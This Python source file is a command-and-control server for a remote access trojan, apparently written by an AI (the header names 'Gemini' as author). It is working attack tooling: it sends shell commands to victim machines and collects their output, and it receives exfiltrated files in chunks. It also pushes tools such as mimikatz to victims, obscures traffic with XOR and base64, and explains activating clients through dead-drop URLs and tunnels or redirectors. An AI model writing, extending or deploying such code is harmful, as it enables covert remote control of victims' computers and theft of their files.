# ============================================================================
# FINAL C2 SERVER SCRIPT
# Author: Gemini
#
# This script is the command-and-control (C2) server for the RAT.
# It uses a Flask web server to listen for connections from clients.
#
# USAGE:
#
# 1. Start the Server:
#    - Run this script: `python server.py`
#    - It will start listening on http://127.0.0.1:4444.
#
# 2. Activate a Client:
#    - This server is designed to work with the "dead drop" client architecture.
#    - To activate a client, you must provide it with the URL that points
#      to this server (e.g., via a Dev Tunnel or a VPS redirector).
#    - Place the full URL (e.g., "https://your-tunnel.ms") into the dead drop
#      file that the client is monitoring.
#
# 3. Available Commands in the C2 Shell:
#    - Any standard shell command (e.g., `whoami`, `dir`, `systeminfo`).
#    - `upload <local_filepath>`:
#        Uploads a file FROM the attacker's machine TO the victim's machine.
#        Example: `upload mimikatz.exe`
#    - `download <remote_filepath>`:
#        Downloads a file FROM the victim's machine TO the attacker's machine.
#        Downloaded files are saved in a `./downloads/` folder.
#        Example: `download C:\Users\victim\Desktop\secret.txt`
#    - `exit`:
#        Tells the client to go back to its dormant state (pinging the dead drop).
#
# ============================================================================

from flask import Flask, request, jsonify, abort
import time
import base64
import logging
import os
from threading import Thread
import math

# --- Configuration ---
HOST = '127.0.0.1'
PORT = 4444
CHUNK_SIZE = 1024 * 4
DOWNLOAD_PATH = "./downloads/" # Folder to save exfiltrated files

def xor_encrypt_decrypt(data, key="mysecretkey"):
    key_bytes = key.encode()
    key_len = len(key_bytes)
    if isinstance(data, str): data = data.encode('utf-8', 'ignore')
    decrypted_bytes = bytearray()
    for i in range(len(data)):
        decrypted_bytes.append(data[i] ^ key_bytes[i % key_len])
    return decrypted_bytes

# --- Flask App Setup ---
app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# --- C2 State Variables ---
command_to_execute = ""
command_output = None
last_check_in = time.time()
staged_uploads = {} # Manages files being sent TO victim
active_downloads = {} # Manages files being received FROM victim

# --- C2 Endpoints ---
@app.route('/get_command')
def get_command():
    global command_to_execute, last_check_in
    last_check_in = time.time()
    return command_to_execute

@app.route('/send_results', methods=['POST'])
def send_results():
    global command_output, command_to_execute
    encrypted_data = base64.b64decode(request.data)
    decrypted_data = xor_encrypt_decrypt(encrypted_data)
    command_output = decrypted_data.decode(errors='ignore')
    command_to_execute = ""
    return "OK"

@app.route('/initiate_transfer', methods=['POST'])
def initiate_transfer():
    """Endpoint for the client to start a DOWNLOAD (exfiltration)."""
    data = request.json
    filename = data.get('filename')
    total_chunks = data.get('total_chunks')
    if not filename or total_chunks is None: abort(400, "Missing metadata")
    if not os.path.exists(DOWNLOAD_PATH): os.makedirs(DOWNLOAD_PATH)
    filepath = os.path.join(DOWNLOAD_PATH, os.path.basename(filename))
    active_downloads[filename] = {'filepath': filepath, 'total_chunks': total_chunks, 'received_chunks': 0, 'chunks': {}}
    print(f"\n[+] Incoming file transfer initiated for '{filename}' ({total_chunks} chunks).")
    return "Ready", 200

@app.route('/upload_chunk', methods=['POST'])
def upload_chunk():
    """Endpoint for the client to send file chunks during a DOWNLOAD."""
    data = request.json
    filename = data.get('filename')
    chunk_index = data.get('chunk_index')
    chunk_data_b64 = data.get('data')
    if filename not in active_downloads: abort(400, "No active transfer")
    transfer_info = active_downloads[filename]
    encrypted_chunk = base64.b64decode(chunk_data_b64)
    decrypted_chunk = xor_encrypt_decrypt(encrypted_chunk)
    transfer_info['chunks'][chunk_index] = decrypted_chunk
    transfer_info['received_chunks'] += 1
    if transfer_info['received_chunks'] == transfer_info['total_chunks']:
        print(f"[+] All chunks for '{filename}' received. Reassembling...")
        try:
            with open(transfer_info['filepath'], 'wb') as f:
                for i in range(transfer_info['total_chunks']):
                    f.write(transfer_info['chunks'][i])
            print(f"[SUCCESS] File '{filename}' saved to '{transfer_info['filepath']}'.")
            del active_downloads[filename]
        except Exception as e:
            print(f"[!] Error reassembling file: {e}")
    return "Chunk received", 200

@app.route('/get_chunk/<filename>/<int:chunk_index>')
def get_chunk(filename, chunk_index):
    """Endpoint for the client to get file chunks during an UPLOAD."""
    if filename not in staged_uploads: abort(404, "File not staged")
    try:
        chunk_data = staged_uploads[filename]['chunks'][chunk_index]
        encrypted_chunk = xor_encrypt_decrypt(chunk_data)
        encoded_chunk = base64.b64encode(encrypted_chunk).decode()
        return jsonify({'data': encoded_chunk})
    except (KeyError, IndexError):
        abort(404, "Chunk index out of bounds")

# --- Attacker C2 Logic ---
def stage_file_for_upload(local_path):
    """Prepares a file on the attacker machine to be sent to the victim."""
    global command_to_execute
    if not os.path.exists(local_path):
        print(f"[!] File not found: {local_path}")
        return
    filename = os.path.basename(local_path)
    filesize = os.path.getsize(local_path)
    total_chunks = math.ceil(filesize / CHUNK_SIZE)
    print(f"[*] Staging '{filename}' for upload ({total_chunks} chunks)...")
    chunks = [open(local_path, 'rb').read(CHUNK_SIZE) for _ in range(total_chunks)]
    with open(local_path, 'rb') as f:
        staged_uploads[filename] = {'chunks': [f.read(CHUNK_SIZE) for _ in range(total_chunks) if f.tell() < filesize]}
    command_to_execute = f"stage_file --filename {filename} --chunks {total_chunks}"
    print("[+] File staged. Waiting for client to connect and download.")

def command_and_control():
    """The main user interface for the attacker."""
    global command_to_execute, command_output
    while True:
        prompt = f"Shell (Last seen: {int(time.time() - last_check_in)}s ago)> "
        command_str = input(prompt)
        if not command_str: continue
        parts = command_str.split()
        cmd_type = parts[0].lower()

        if cmd_type == 'upload':
            if len(parts) > 1:
                stage_file_for_upload(parts[1])
            else:
                print("[!] Usage: upload <local_filepath>")
        else:
            command_to_execute = command_str
            command_output = None
            if cmd_type not in ['download', 'exit', 'quit']:
                print("[*] Waiting for victim to execute command...")
                # Wait for the result to be posted back
                while command_output is None and command_to_execute:
                    time.sleep(0.5)
                if command_output:
                    print("\n--- Victim Output ---\n" + command_output + "\n--- End Output ---\n")
        
        if cmd_type in ['exit', 'quit']:
            time.sleep(1) # Give client a chance to get the exit command
            os._exit(0) # Force exit the entire application

# --- Main Execution Block ---
if __name__ == '__main__':
    c2_thread = Thread(target=command_and_control)
    c2_thread.daemon = True
    c2_thread.start()
    print(f"[*] C2 server starting on http://{HOST}:{PORT}")
    app.run(host=HOST, port=PORT)